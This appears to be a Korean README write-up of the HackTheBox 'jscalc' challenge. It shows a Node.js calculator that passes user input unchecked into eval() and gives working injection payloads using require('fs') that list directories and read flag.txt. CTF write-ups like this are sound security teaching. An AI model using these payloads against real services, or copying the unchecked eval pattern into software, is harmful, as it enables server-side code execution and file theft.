# Jscalc
![js](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=JavaScript&logoColor=white) ![js](https://img.shields.io/badge/Node.js-43853D?style=for-the-badge&logo=node.js&logoColor=white)

# 개요
 - hackthebox jscalc 문제 입니다.

# Preview
<img width="1469" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/cd4be4ee-5d19-40a7-ba79-d6ee22d36adc">


# Source
 - calculatorHelper.js
```
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```
 - package.json
```
{
	"name": "jscalc",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"nodeVersion": "v8.12.0",
	"scripts": {
		"start": "node index.js"
	},
	"keywords": [],
	"authors": [
		"makelaris",
		"makelarisjr"
	],
	"dependencies": {
		"body-parser": "^1.19.0",
		"express": "^4.17.1"
	}
}
```

# Dir
 - directory Tree
```
.
├── Dockerfile
├── build-docker.sh
├── challenge
│   ├── helpers
│   │   └── calculatorHelper.js
│   ├── index.js
│   ├── package-lock.json
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   └── main.css
│   │   ├── favicon.png
│   │   └── js
│   │       └── main.js
│   ├── views
│   │   └── index.html
│   └── yarn.lock
├── config
│   └── supervisord.conf
├── flag.txt
└── supervisord.conf

```

# 취약점
 - 제공되었던 취약점 소스코드를 보면 eval이라는 함수를 사용하는것을 확인할수있고 블랙리스트 검증을 거치지 않은것을 확인할수있다.
```
return eval(`(function() { return ${ formula } ;}())`);
```
 - eval() 이라는 함수는 인자값을 js인터프리터를 사용해야 하기 때문에 해당 인자값을 악의적인 코드를 삽입하여 공격할수 있게된다.
 - 즉 eval()은 javascript를 실행하는 함수인것이다.
 - 다음으로 package.json 코드를 살펴보면 start를 node index.js 로 하는것을 확인할수 있다.
 - 즉 nodejs를 사용한다는것을 알수 있고
 - fs(FileSystem) 모듈을 활용하여 파일입출력을 받아 flag를 출력할수 있게 된다.

#Payload
 - 하위디렉토리에 있는 파일의명을 string으로 출력
```
require('fs').readdirSync('../').toString()
```
<img width="1470" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/b92afd03-0b9d-4f99-80f3-fbb3f2d8ae76">

 - 하위디렉토리에 있는 flag.txt라는 파일의 내용을 string으로 출력
```
require('fs').readFileSync('../flag.txt').toString()
```
<img width="940" alt="image" src="https://github.com/ChCh0i/steel/assets/108965611/8b219ac5-4fcf-417b-83f9-e3355ca37a1e">
